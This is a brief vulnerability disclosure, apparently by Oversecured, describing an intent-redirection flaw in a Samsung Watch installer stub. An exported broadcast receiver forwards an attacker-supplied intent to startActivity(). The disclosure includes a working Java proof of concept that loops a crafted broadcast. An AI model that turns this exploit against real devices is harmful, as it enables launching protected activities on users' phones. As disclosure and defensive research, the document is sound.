# Description

Oversecured discovered the following vulnerability:
![](Oversecured_report.png)

A receiver was registered in the process of installing apps on a Samsung Watch, which received broadcasts from any third-party apps installed on the same device. After that, it passed the intent controlled by the attacker to `Context.startActivity()`.

**Proof of Concept**

```java
new Thread(() -> {
    Intent i = new Intent("com.samsung.android.app.watchmanagerstub.INSTALL_COMPLETE");
    i.putExtra("android.content.pm.extra.STATUS", -1);
    i.putExtra("android.intent.extra.INTENT", new Intent(Intent.ACTION_VIEW, Uri.parse("https://google.com/")));

    while (true) {
        sendBroadcast(i);
        try {
            Thread.sleep(100);
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}).start();
```
